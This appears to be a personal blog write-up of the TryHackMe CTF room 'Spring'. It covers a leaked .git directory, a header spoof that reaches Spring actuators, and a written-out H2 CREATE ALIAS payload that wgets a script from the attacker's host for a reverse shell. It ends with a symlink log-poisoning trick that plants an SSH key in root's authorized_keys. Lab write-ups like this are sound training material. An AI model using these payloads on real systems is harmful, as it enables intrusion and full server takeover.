---
layout: post
title: CTF Log - Spring {THM}
description: A log of how I did the TryHackMe room Spring by onurshin
summary: A log of the THM room "Spring"
tags: ctf log
minute: 9
---
<br/>

> {{ page.description }}

<br/>

# Spring
## Exposed .git Directory, Actuators /env & /restart RCE
The open ports are 22, 80, 443. The ssl cert information reveals the domain name `spring.thm` and the name `John Smith`. 

Navigating to the site on port 80 redirects to 443 with HTTPS. The landing page is practically blank.

Taking a queue from the name, I do an `ffuf` scan with SecLists's `spring-boot.txt` file. This just informs me that everything under the `actuator/` web directory returns a `403`. 

A recursive directory scan with the `dirsearch` wordlist reveals a `/sources/new/.git`. I use `dumper` from GitTools to download the folder then `extractor` to build out the file structure.

```java
    @Configuration
    @EnableWebSecurity
    static class SecurityConfig extends WebSecurityConfigurerAdapter {

        @Override
        protected void configure(HttpSecurity http) throws Exception {
            http
                    .authorizeRequests()
                    .antMatchers("/actuator**/**").hasIpAddress("172.16.0.0/24")
                    .and().csrf().disable();
        }

    }
}
```

This code snippet from `Application.java` shows why the `actuator/` directory was returning a `403` response. The `hasIpAddress("172.16.0.0/24")` function is forbidding addresses outside of the `172.16.0.0/24` subnet from visiting that directory. 

The `application.properties` file has a lot of useful information which I end up using further in the CTF. At this point, the relevant line is `server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04`. A quick look at the [tomcat documentation](https://tomcat.apache.org/tomcat-8.5-doc/api/org/apache/catalina/valves/RemoteIpValve.html#:~:text=Name%20of%20the%20Http%20Header%20read%20by%20this%20valve%20that%20holds%20the%20list%20of%20traversed%20IP%20addresses%20starting%20from%20the%20requesting%20client) shows that this replaces the usual `x-forwarded-for`. Knowing this, I'm able to send a request using the `x-9ad42dea0356cb04` header to tell the server that my IP is one from the correct subnet. 

![assets/media/spring/x-forwarded-for.png](GET request with the aforementioned header parameter with 172.16.0.0 value, 200 response by server)

This time the server lets me through and responds with a JSON of the available endpoints:

```json
{
    "_links":
    {
        "self":
        {
            "href": "https://spring.thm/actuator",
            "templated": false
        },
        "beans":
        {
            "href": "https://spring.thm/actuator/beans",
            "templated": false
        },
        "health":
        {
            "href": "https://spring.thm/actuator/health",
            "templated": false
        },
        "health-path":
        {
            "href": "https://spring.thm/actuator/health/{*path}",
            "templated": true
        },
        "shutdown":
        {
            "href": "https://spring.thm/actuator/shutdown",
            "templated": false
        },
        "env-toMatch":
        {
            "href": "https://spring.thm/actuator/env/{toMatch}",
            "templated": true
        },
        "env":
        {
            "href": "https://spring.thm/actuator/env",
            "templated": false
        },
        "mappings":
        {
            "href": "https://spring.thm/actuator/mappings",
            "templated": false
        },
        "restart":
        {
            "href": "https://spring.thm/actuator/restart",
            "templated": false
        }}}
```

There's a technique for getting code execution through exposed actuator endpoints that I learned from [this site](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database). 

> <b>tldr;</b>
> Can use the `/env` endpoint to set an environment variable which will have a SQL query executed on restart. I use the `CREATE ALIAS` SQL command to define a Java function, which I then use to execute arbitrary commands on the OS. 

It takes two payloads and restarts for me to get a reverse shell. First to download the shell script onto the machine, then to execute it.

```json
{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('wget 10.13.1.225:9090/r.sh -O /tmp/r.sh');"}
```

This is the first payload, to download the script. I then use the `/restart` endpoint to restart the application and have the command executed. The second payload just calls `/bin/bash /tmp/r.sh`. I make sure to add `Content-Type: application/json` to each POST request as well. 

I get a shell as `nobody`. 

## Password Guessing
![assets/media/spring/nobody_env_vars.png](Environment variables, password is PrettyS3cureKeystorePassword123.)

This screenshot shows the environment variables for the user `nobody`. 

Of note is the `SUDO_COMMAND` variable that's revealing a password used in the launch of the actuator application. Interestingly, a similarly formatted password was present in the `.git` directory that I cloned earlier. 

```java
spring.security.user.name=johnsmith
spring.security.user.password=PrettyS3cureSpringPassword123.
debug=false
spring.cloud.config.uri=
```

This is a snippet of code from the `application.properties` file from the leaked `.git` directory. The same password format is used. I would have brute forced `su` using [sucrack](https://github.com/hemp3l/sucrack) but after around five guesses I hit the correct password and get a shell as `johnsmith`. 

## Log Poisoning & Symbolic Link
This was a really neat privesc, I enjoyed it a lot. 

In `johnsmith`'s home directory there's a `/tomcatlogs` directory. It appears to contain logs whose names are an epoch timestamp.

![assets/media/spring/systemctl.png](systemctl status spring output)

There are two things to notice about the above screenshot. The first is that one of the processes spawned from the spring service is a `tee` of the logs to a logfile in the `/tomcatlogs` directory. The second is that I was able to use `systemctl shutdown spring` and the service automatically restarted, prompting a `tee` command to a new log file. 

```java
    @RestController
    //https://spring.io/guides/gs/rest-service/
    static class HelloWorldController {
        @RequestMapping("/")
        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
            System.out.println(name);
            return String.format("Hello, %s!", name);
        }
    }
```

The code above is from the `Application.java` file. It defines a class and function that take the `name` GET parameter and display it on the page, at the landing page location, `/`. 

![assets/media/spring/name_test.png](GET request with "oriel" as name parameter value)

This screenshot shows a test of my hypothesis and confirms that the `name` parameter's value is reflected in the page. 

```bash
johnsmith@spring:~$ cat test.txt 
2021-10-17 20:09:15.385  INFO 8014 --- [           main] trationDelegate$BeanPostProcessorChecker : Bean 'org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration' of type [org.springframework.cloud.autoconfigure.ConfigurationPropertiesRebinderAutoConfiguration$$EnhancerBySpringCGLIB$$7af57240] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying)

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.3.1.RELEASE)

2021-10-17 20:09:16.483  INFO 8014 --- [           main] c.c.c.ConfigServicePropertySourceLocator : Fetching config from server at : http://localhost:8888

<!--Snipped!-->

World
oriel
johnsmith@spring:~$ 
```

Next, is a look through a log file which confirms that the value `oriel` is output into the log file. The filename `test.txt` will now be discussed. 

Since the `tee` command doesn't delete a file if it is already present, I'm able to create many log files whose names could contain the exact epoch time at which the service's `tee` command is executed. 

These files are then symlinked to `/root/.ssh/authorized_keys`. The command to perform this is `for x in {1634500389..1634502000};do touch $x.log && ln -s -f ~/test.txt $x.log;done`. I based the epoch time value on the current log file's and then added a thousand or two. 

![assets/media/spring/post_ssh_key.png](GET request with public SSH key as name parameter value)

Since sshd ignores incorrect lines in the `authorized_keys` file, I'm able to send my URL encoded RSA public key through the `name` parameter. My public key will then be logged to one of my thousand symlinked files, which will put it in `root`'s `authorized_keys` file. 

I am then able to `ssh` in as `root`. 